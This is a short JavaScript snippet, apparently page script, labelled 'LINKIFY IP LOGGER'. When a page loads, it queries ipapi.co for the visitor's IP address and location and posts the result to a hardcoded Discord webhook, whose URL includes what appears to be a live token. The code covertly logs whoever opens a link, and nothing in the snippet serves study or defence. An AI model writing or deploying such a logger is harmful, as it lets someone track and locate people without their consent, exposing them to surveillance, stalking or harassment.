{
function GetURLParameter(sParam)
{
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split('&');
    for (var i = 0; i < sURLVariables.length; i++) 
    {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) 
        {
            return sParameterName[1];
        }
    }
}
    function discord_message(webHookURL, message) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webHookURL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': message,
            'username':'LINKIFY IP LOGGER',
        }));
    };

$.getJSON('https://ipapi.co/json/', function(data) {
const hook = decodeURI(GetURLParameter('hook'))
discord_message('https://discord.com/api/webhooks/1022802287724335114/2tLZRZOAsgHkuF9W9HbeWYju7U6Db9YrXThWAIvgCg-SRngmBG5RkEO6s4FAD5rLe5CX', JSON.stringify(data, null, 2))

  

});
}